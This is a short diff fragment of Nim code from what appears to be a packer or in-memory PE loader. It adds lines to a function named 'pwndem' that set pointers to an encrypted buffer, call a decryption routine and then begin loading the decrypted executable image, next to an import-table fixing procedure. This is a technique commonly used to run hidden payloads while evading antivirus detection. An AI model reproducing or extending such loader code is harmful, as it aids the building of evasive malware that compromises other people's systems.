@@ -199,7 +199,9 @@ proc fixIAT*(modulePtr: PVOID): bool =
     return true
 
 proc pwndem(): void =
-
+    ptrEncText = cast[ptr byte](addr encText[0])
+    ptrDecText = cast[ptr byte](addr decText[0])
+    decryptlate()
     var peToLoadPtr: ptr = dectext[0].addr
 
     var pImageBase: ptr BYTE = nil
